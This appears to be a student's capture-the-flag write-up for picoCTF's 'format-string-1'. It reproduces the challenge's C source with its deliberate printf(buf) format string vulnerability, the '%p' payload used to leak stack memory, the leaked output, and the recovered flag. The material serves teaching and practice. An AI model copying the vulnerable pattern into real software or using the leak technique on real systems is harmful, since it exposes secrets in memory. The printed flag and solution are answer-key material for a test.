# format-string-1.md

flag : picoCTF{4n1m41_57y13_4x4_f14g_e11e8018}

## My Approach

I first checked the source code

```
#include <stdio.h>


int main() {
  char buf[1024];
  char secret1[64];
  char flag[64];
  char secret2[64];

  // Read in first secret menu item
  FILE *fd = fopen("secret-menu-item-1.txt", "r");
  if (fd == NULL){
    printf("'secret-menu-item-1.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(secret1, 64, fd);
  // Read in the flag
  fd = fopen("flag.txt", "r");
  if (fd == NULL){
    printf("'flag.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(flag, 64, fd);
  // Read in second secret menu item
  fd = fopen("secret-menu-item-2.txt", "r");
  if (fd == NULL){
    printf("'secret-menu-item-2.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(secret2, 64, fd);

  printf("Give me your order and I'll read it back to you:\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your order: ");
  printf(buf);
  printf("\n");
  fflush(stdout);

  printf("Bye!\n");
  fflush(stdout);

  return 0;
}
```
we see a string vulnerability, they are not accepting string using %s.              
Similar to a previous chall, so I simply gave an input of %p, multiple times, thru hit and trial method. The hint said 32 bytes or 64 bytes, so I entered 32 %p's, I don't know if that was relevant but okay.    
And I got :     
```
 0x402118,(nil),0x7e1c68fc1a00,(nil),0x5d4880,0xa347834,0x7ffd8cce8220,0x7e1c68db2e60,0x7e1c68fd74d0,0x1,0x7ffd8cce82f0,(nil),(nil),0x7b4654436f636970,0x355f31346d316e34,0x3478345f33317937,0x31655f673431665f,
0x7d383130386531,0x7,0x7e1c68fd98d8,0x2300000007,0x206e693374307250,0xa336c797453,0x9,0x7e1c68feade9,0x7e1c68dbb098,0x7e1c68fd74d0,(nil),0x7ffd8cce8300,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70
```

I put this on CyberChef (from Hex) and got the flag reversed, after which I reversed the flag and got the correct answer.

![image](https://github.com/user-attachments/assets/fe2d077c-63d9-424a-bfc2-5374a2a43536)                   

## Terminal Ouput :
```
avantikasanyal@LAPTOP-CFRE3HMA:~$ nc mimas.picoctf.net 55797
Give me your order and I'll read it back to you:
%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p
Here's your order: 0x402118,(nil),0x7e1c68fc1a00,(nil),0x5d4880,0xa347834,0x7ffd8cce8220,0x7e1c68db2e60,0x7e1c68fd74d0,0x1,0x7ffd8cce82f0,(nil),(nil),0x7b4654436f636970,0x355f31346d316e34,0x3478345f33317937,0x31655f673431665f,0x7d383130386531,0x7,0x7e1c68fd98d8,0x2300000007,0x206e693374307250,0xa336c797453,0x9,0x7e1c68feade9,0x7e1c68dbb098,0x7e1c68fd74d0,(nil),0x7ffd8cce8300,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70
Bye!
```

## What I learnt?
1. Format String vul
2. Stack Layout
3. Decoding Hex Values

##  Errors :
I was reversing the flag wrong, I spent SO many hours on it.
